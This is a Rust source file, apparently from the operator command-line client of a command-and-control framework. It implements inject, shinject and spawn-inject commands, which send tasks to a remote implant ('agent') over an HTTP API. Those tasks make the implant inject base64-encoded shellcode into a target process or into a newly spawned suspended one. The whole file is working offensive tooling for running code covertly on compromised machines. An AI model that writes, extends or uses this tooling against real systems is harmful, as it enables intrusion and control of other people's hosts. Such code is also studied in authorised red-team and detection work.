//! Process injection commands: inject, shinject, spawn-inject.

use anyhow::{anyhow, Result};
use base64::{engine::general_purpose::STANDARD as B64, Engine};

use crate::display;
use crate::http::resolve_agent_identifier;

use super::CliCtx;

/// inject <agent> <pid> <shellcode_path> — inject shellcode into a running process.
pub fn cmd_inject(ctx: &CliCtx, agent: &str, pid: u32, shellcode_path: &str) -> Result<()> {
    let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;

    let shellcode = std::fs::read(shellcode_path)
        .map_err(|e| anyhow!("cannot read shellcode file '{}': {}", shellcode_path, e))?;
    if shellcode.is_empty() {
        return Err(anyhow!("shellcode file '{}' is empty", shellcode_path));
    }

    let shellcode_b64 = B64.encode(&shellcode);

    let task_payload = serde_json::to_string(&serde_json::json!({
        "pid": pid,
        "shellcode_b64": shellcode_b64,
    }))?;

    let res = ctx
        .cli
        .post(format!("{}/v1/command/{}", ctx.base, agent_id))
        .json(&serde_json::json!({
            "command": task_payload,
            "task_type": "inject",
        }))
        .send()?;

    if !res.status().is_success() {
        return Err(anyhow!(
            "inject failed: status={} body={}",
            res.status(),
            res.text()?
        ));
    }

    display::print_success(&format!(
        "inject queued: {} bytes → PID {} on agent {}",
        shellcode.len(),
        pid,
        agent_id
    ));
    Ok(())
}

/// shinject <agent> <pid> <remote_path> — agent reads shellcode from its own filesystem.
pub fn cmd_shinject(ctx: &CliCtx, agent: &str, pid: u32, remote_path: &str) -> Result<()> {
    let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;

    let task_payload = serde_json::to_string(&serde_json::json!({
        "pid": pid,
        "shellcode_path": remote_path,
    }))?;

    let res = ctx
        .cli
        .post(format!("{}/v1/command/{}", ctx.base, agent_id))
        .json(&serde_json::json!({
            "command": task_payload,
            "task_type": "shinject",
        }))
        .send()?;

    if !res.status().is_success() {
        return Err(anyhow!(
            "shinject failed: status={} body={}",
            res.status(),
            res.text()?
        ));
    }

    display::print_success(&format!(
        "shinject queued: PID {} path '{}' on agent {}",
        pid, remote_path, agent_id
    ));
    Ok(())
}

/// spawn-inject <agent> <shellcode_path> [--spawn-exe <exe>] — spawn suspended + inject.
pub fn cmd_spawn_inject(
    ctx: &CliCtx,
    agent: &str,
    shellcode_path: &str,
    spawn_exe: Option<&str>,
) -> Result<()> {
    let agent_id = resolve_agent_identifier(ctx.cli, ctx.base, agent)?;

    let shellcode = std::fs::read(shellcode_path)
        .map_err(|e| anyhow!("cannot read shellcode file '{}': {}", shellcode_path, e))?;
    if shellcode.is_empty() {
        return Err(anyhow!("shellcode file '{}' is empty", shellcode_path));
    }

    let shellcode_b64 = B64.encode(&shellcode);

    let task_payload = serde_json::to_string(&serde_json::json!({
        "shellcode_b64": shellcode_b64,
        "spawn_exe": spawn_exe,
    }))?;

    let res = ctx
        .cli
        .post(format!("{}/v1/command/{}", ctx.base, agent_id))
        .json(&serde_json::json!({
            "command": task_payload,
            "task_type": "spawn_inject",
        }))
        .send()?;

    if !res.status().is_success() {
        return Err(anyhow!(
            "spawn-inject failed: status={} body={}",
            res.status(),
            res.text()?
        ));
    }

    let exe_display = spawn_exe.unwrap_or("(agent default)");
    display::print_success(&format!(
        "spawn-inject queued: {} bytes via '{}' on agent {}",
        shellcode.len(),
        exe_display,
        agent_id
    ));
    Ok(())
}
